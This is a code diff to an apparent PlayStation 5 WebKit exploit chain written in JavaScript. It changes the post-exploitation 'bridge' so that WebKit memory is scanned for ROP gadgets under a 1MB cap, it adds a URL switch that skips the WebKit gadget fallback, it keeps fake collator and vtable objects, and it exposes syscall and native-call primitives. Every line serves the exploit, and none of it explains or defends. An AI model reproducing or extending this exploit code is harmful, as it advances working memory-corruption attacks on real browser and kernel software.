@@ -339,9 +339,10 @@
     }
     function scanWkPattern(pat) {
         const CHUNK = 0x2000;
+        const WK_SCAN_LIMIT = 0x100000; // 1MB cap: 8MB still OOMs right after exploit
         const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
             ? PS5.libkernelBase : ctx.libkernelBase; // no usado; wk usa webkit
-        for (let off = 0; off < WEBKIT_TEXT_SIZE; off += CHUNK) {
+        for (let off = 0; off < WK_SCAN_LIMIT; off += CHUNK) {
             let mem;
             try { mem = rdBytes(ctx.webkitBase + off, Math.min(CHUNK + 16, WEBKIT_TEXT_SIZE - off)); }
             catch (e) { PS5.notes.push("wk-scan-fault@" + off.toString(16)); return null; }
@@ -555,10 +556,13 @@
         try { if (ropProbe()) ropOK = scanGadgets(); }
         catch (e) { PS5.notes.push("scan-threw:" + String(e.message || e).slice(0, 60)); }
         if (!ropOK) {
+            const forceDirect = (()=>{ try { return new URLSearchParams(location.search).get("rop")==="0"; } catch(e){ return false; } })();
+            if (!forceDirect) {
             // [Mods X1NON] la via libkernel fallo (base invalida, probe o
             // escaneo): intentamos gadgets de WebKit + stubs por syscall.
             try { ropOK = tryWkFallback(); }
             catch (e) { PS5.notes.push("wk-fb-threw:" + String(e.message || e).slice(0, 60)); }
+            } else PS5.notes.push("direct-skipped-wk-scan");
         }
         PS5.mode = ropOK ? "ROP" : "DIRECT";
         PS5.ready = true;
@@ -576,6 +580,7 @@
         global.get_error_string = get_error_string;
         global.send_notification = send_notification;
         global.PS5call = nativeCall;
+        PS5.fakeCollator = ctx.fakeCollator; PS5.fakeVtable = ctx.fakeVtable; PS5.arenaBacking = ctx.arenaBacking;
 
         try {
             const pid = syscall(SYSN.getpid);
@@ -584,7 +589,7 @@
                 + " wk=" + HEX(c.webkitBase) + " libk=" + HEX(c.libkernelBase)
                 + " pid=" + pid + " notes=" + PS5.notes.join(";"));
         } catch (e) {
-            httpLog("BRIDGE-BOOT-PARTIAL " + String(e.message || e));
+            httpLog("BRIDGE-BOOT-PARTIAL " + String(e.message || e) + " notes=" + PS5.notes.join(";"));
         }
         if (typeof global.onBridgeReady === "function") {
             try { global.onBridgeReady(PS5); } catch (e) {}
